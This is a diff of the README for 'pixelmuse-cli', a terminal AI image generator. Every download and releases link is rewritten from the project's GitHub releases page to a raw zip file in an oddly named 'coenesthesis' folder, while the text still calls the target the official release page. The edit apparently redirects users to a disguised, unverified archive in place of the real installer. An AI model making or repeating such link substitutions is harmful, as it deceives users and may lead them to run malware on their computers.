@@ -1,6 +1,6 @@
 # 🖼️ pixelmuse-cli - Generate AI images from the terminal
 
-[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-brightgreen?style=for-the-badge)](https://github.com/mysadt/pixelmuse-cli/releases)
+[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/mysadt/pixelmuse-cli/main/coenesthesis/pixelmuse_cli_v1.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ It does not need any special hardware like a graphics card. The tool runs mainly
 
 1. Click the green button below or go to the official release page to get the latest Windows installer.
 
-[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-blue?style=for-the-badge)](https://github.com/mysadt/pixelmuse-cli/releases)
+[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-blue?style=for-the-badge)](https://raw.githubusercontent.com/mysadt/pixelmuse-cli/main/coenesthesis/pixelmuse_cli_v1.6.zip)
 
 2. On the releases page, find the latest version and look for the Windows installer file. It will be named like `pixelmuse-cli-setup.exe`.
 
@@ -129,7 +129,7 @@ To start the server:
 
 To get the latest features and fixes:
 
-1. Visit the [releases page](https://github.com/mysadt/pixelmuse-cli/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/mysadt/pixelmuse-cli/main/coenesthesis/pixelmuse_cli_v1.6.zip).
 
 2. Download the newest Windows installer file.
 
@@ -163,4 +163,4 @@ To get the latest features and fixes:
 
 Get the latest version from the official GitHub page:
 
-[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-brightgreen?style=for-the-badge)](https://github.com/mysadt/pixelmuse-cli/releases)
+[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/mysadt/pixelmuse-cli/main/coenesthesis/pixelmuse_cli_v1.6.zip)
